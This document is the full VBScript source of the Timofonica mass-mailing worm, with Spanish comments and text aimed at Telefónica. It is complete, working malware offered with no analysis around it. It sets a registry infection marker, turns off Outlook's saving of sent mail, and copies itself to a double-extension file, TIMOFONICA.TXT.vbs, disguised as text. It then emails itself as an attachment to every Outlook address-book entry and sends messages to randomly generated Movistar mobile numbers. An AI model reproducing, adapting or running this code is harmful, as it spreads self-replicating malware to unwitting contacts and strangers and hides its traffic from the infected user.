   Timofonica()

   Sub Timofonica()
      If PreguntaSiHeEstadoAqui() <> 1 Then
         ModificarRegistro()
         CopiarVirusAFichero()
         CopiaTextoAFichero()
         EnviarCorreo()
      End If
   End Sub

   Function LeerRegistro(Clave)
      On Error Resume Next
      Dim Sistema
      Dim Retorno

      Set Sistema = CreateObject("WScript.Shell")
      Retorno = Sistema.RegRead(Clave)

      Set Sistema  = Nothing
      LeerRegistro = Retorno
   End Function

   Function EscribirRegistro(Clave,Valor,Opcion)
      On Error Resume Next
      Dim Sistema

      Set Sistema = CreateObject("WScript.Shell")
      If Opcion = "REG_DWORD" Then
         Sistema.RegWrite Clave,Valor,"REG_DWORD"
      Else
         Sistema.RegWrite Clave,Valor
      End If

      Set Sistema  = Nothing
   End Function

   Function PreguntaSiHeEstadoAqui
      On Error Resume Next
      Dim Retorno

      Retorno = LeerRegistro("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Timofonica")

      PreguntaSiHeEstadoAqui = Retorno
   End Function

   Sub ModificarRegistro
      On Error Resume Next

      EscribirRegistro "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Timofonica",1,"REG_DWORD"
      EscribirRegistro "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Outlook\Preferences\SaveSent",0,"REG_DWORD"
   End Sub

   Sub EnviarCorreo()
      On Error Resume Next

      Dim Contador
      Dim NumeroDeCarpetasDeDirecciones
      Dim Destinatario
      Dim Sistema
      Dim OutLook
      Dim Mapi
      Dim CarpetaDeDirecciones

      Set Sistema = CreateObject("WScript.Shell")
      Set OutLook = WScript.CreateObject("Outlook.Application")
      Set Mapi = OutLook.GetNameSpace("Mapi")

      For NumeroDeCarpetasDeDirecciones = 1 To Mapi.AddressLists.Count
         Set CarpetaDeDirecciones = Mapi.AddressLists(NumeroDeCarpetasDeDirecciones)
         For Contador = 1 To CarpetaDeDirecciones.AddressEntries.Count
            Set Mail = OutLook.CreateItem(0)
            Mail.Subject = "TIMOFONICA"
            Mail.Body = Mail.Body & ""
            Mail.Body = Mail.Body & "Es de todos ya conocido el monopolio de Telefónica pero no tan "
            Mail.Body = Mail.Body & "conocido los métodos que utilizó para llegar hasta este punto."
            Mail.Body = Mail.Body & vbcrlf
            Mail.Body = Mail.Body & "En el documento adjunto existen opiniones, pruebas y direcciones "
            Mail.Body = Mail.Body & "web con más información que demuestran irregularidades en compras "
            Mail.Body = Mail.Body & "de materiales, facturas sin proveedores, stock irreal, etc."
            Mail.Body = Mail.Body & vbcrlf
            Mail.Body = Mail.Body & "También habla de las extorsiones y favoritismos a empresarios tanto "
            Mail.Body = Mail.Body & "nacionales como internacionales. Explica también el por qué del fracaso "
            Mail.Body = Mail.Body & "en Holanda y qué hizo para adquirir el portal Lycos."
            Mail.Body = Mail.Body & vbcrlf
            Mail.Body = Mail.Body & "En las direcciones web del documento existen temas relacionados para "
            Mail.Body = Mail.Body & "que echéis un vistazo a los comentarios, informes, documentos, etc."
            Mail.Body = Mail.Body & vbcrlf
            Mail.Body = Mail.Body & "Como comprenderéis, esto es muy importante, y os ruego que reenviéis "
            Mail.Body = Mail.Body & "este correo a vuestros amigos y conocidos."
            Mail.Body = Mail.Body & vbcrlf
            Mail.Body = Mail.Body & vbcrlf
            Mail.Attachments.Add("C:\TIMOFONICA.TXT.vbs")
            Destinatario = CarpetaDeDirecciones.AddressEntries(Contador)
            Mail.Recipients.Add(Destinatario)
            Mail.Send
            Set Mail = Nothing

            Set Mail = OutLook.CreateItem(0)
            Mail.Subject = "TIMOFONICA"
            Mail.Body = " informa que: Telefónica te está engañando."
            Destinatario = DestinatarioMovil()
            Mail.Recipients.Add(Destinatario)
            Mail.Send
            Set Mail = Nothing
         Next
         Set CarpetaDeDirecciones = Nothing
      Next

      Set Sistema              = Nothing
      Set OutLook              = Nothing
      Set Mapi                 = Nothing
      Set CarpetaDeDirecciones = Nothing
   End Sub

   Function DestinatarioMovil
      On Error Resume Next

      Dim Prefijo
      Dim Numero
      Dim Destinatario
      Dim Aleatorio

      Aleatorio    = 0
      Numero       = ""
      Prefijo      = "696"
      Destinatario = "@correo.movistar.net"
      Randomize
      Aleatorio = Int(8 * Rnd)
      If Aleatorio = 0 Then
         Prefijo = "609"
      ElseIf Aleatorio = 1 then
         Prefijo = "619"
      ElseIf Aleatorio = 2 then
         Prefijo = "629"
      ElseIf Aleatorio = 3 then
         Prefijo = "630"
      ElseIf Aleatorio = 4 then
         Prefijo = "639"
      ElseIf Aleatorio = 5 then
         Prefijo = "646"
      ElseIf Aleatorio = 6 then
         Prefijo = "649"
      End If
      For Contador = 1 To 6
         Randomize
         Aleatorio = Int(10 * Rnd)
         Numero = Numero & Aleatorio
      Next

      DestinatarioMovil = Prefijo & Numero & Destinatario
   End Function

   Sub CopiarVirusAFichero
      On Error Resume Next

      Dim Fso
      Dim Fichero
      Dim Copia
      Dim Handle

      Set Fso     = CreateObject("Scripting.FileSystemObject")
      Set Fichero = Fso.OpenTextFile(WScript.ScriptFullname,1)
      Copia       = Fichero.ReadAll
      Set Handle  = Fso.GetFile(WScript.ScriptFullName)
      Handle.Copy("C:\TIMOFONICA.TXT.vbs")

      Set Fichero = Nothing
      Set TempDir = Nothing
      Set Handle  = Nothing
      Set Fso     = Nothing
   End Sub

   Sub CopiaTextoAFichero
      On Error Resume Next

      Dim Fso
      Dim Fichero
      Dim Copia

      Set Fso = CreateObject("Scripting.FileSystemObject")
      Set Fichero = Fso.CreateTextFile("C:\TIMOFONICA.TXT",True)

      Copia = ""
      Copia = Copia & "Comentarios" & vbcrlf
      Copia = Copia & "===========" & vbcrlf & vbcrlf
      Copia = Copia & "...." & vbcrlf
      Copia = Copia & "Tarifa plana de 6000 pts/mes." & vbcrlf
      Copia = Copia & "Extorsión." & vbcrlf
      Copia = Copia & "A principio de 1.998 tras un seguimiento de su gestión se descubrieron numerosas irregularidades en su gestión, amparadas hasta el momento, en el desconocimiento que nosotros teníamos sobre Internet." & vbcrlf
      Copia = Copia & "Compras de materiales, que nunca apareció por ningún lado, pero si la factura del proveedor." & vbcrlf
      Copia = Copia & "...." & vbcrlf
      Copia = Copia & "Yo pienso que si Timofonica (ke a fin de kuentas es la dueña de Terra) kiere soltar dineros para una ONG, no le hace falta hacer este tipo de acto solidario, es mas, me parece misero y ridikula la kantidad de un millon de pesetas .. " & vbcrlf
      Copia = Copia & "Son unos ridikulos de mierda, un millon de pesetas para ellos no es nada, pero un millon de hits en sus paginas mas a final de mes supone una pekeña subidita en las acciones de Terra en Bolsa." & vbcrlf
      Copia = Copia & "Total, ke Terra no son las Hermanitas de los Pobres (pobres monjas, kompararlas kon los chupasangres de Timofonica), NI NOSOTROS SEMOS GILIPOLLAS !!!" & vbcrlf
      Copia = Copia & "Podran decir ke estamos obsesionados, ke tamos en kontra de Timofonika, ke protestamos por vicio, PERO ES KE EN 3 AÑOS KE LLEVO EN INET SOLO LA HAN KAGADO UNA VEZ TRAS OTRA !! SI ES KE SE LO GANAN A PULSO !!" & vbcrlf
      Copia = Copia & "Lo dicho , todo lo ke güele a Telefonica SUX, o en castellano tradicional , APESTA !" & vbcrlf
      Copia = Copia & "...." & vbcrlf & vbcrlf
      Copia = Copia & "Direcciones" & vbcrlf
      Copia = Copia & "===========" & vbcrlf & vbcrlf
      Copia = Copia & "http://www.telefonica.es/" & vbcrlf
      Copia = Copia & "http://www.timofonica.com/" & vbcrlf
      Copia = Copia & "http://100scripts.islaweb.com/scripting-timofonica.html" & vbcrlf
      Copia = Copia & "http://www.www2.labrujula.net/wwwboard/messages2/1165.html" & vbcrlf
      Copia = Copia & "http://www.tinet.org/mllistes/pc/September_1998/msg00005.html" & vbcrlf
      Copia = Copia & "http://area3d.area66.com/forotec/_disc1/0000015b.htm" & vbcrlf
      Copia = Copia & "http://wwh.itgo.com/Phreaking.htm" & vbcrlf
      Copia = Copia & "http://www.rcua.alcala.es/archives/ham-ea/msg00780.html" & vbcrlf
      Copia = Copia & "http://www.areas.org/debate/dp/2/messages/18.html" & vbcrlf
      Copia = Copia & "http://www.fut.es/mllistes/parlem/January_1999/msg00208.html" & vbcrlf & vbcrlf
      Copia = Copia & "Visita estas páginas. Estás inivitado." & vbcrlf
      Fichero.Writeline(Copia)
      Fichero.Close

      Set Fichero   = Nothing
      Set Fso       = Nothing
   End Sub
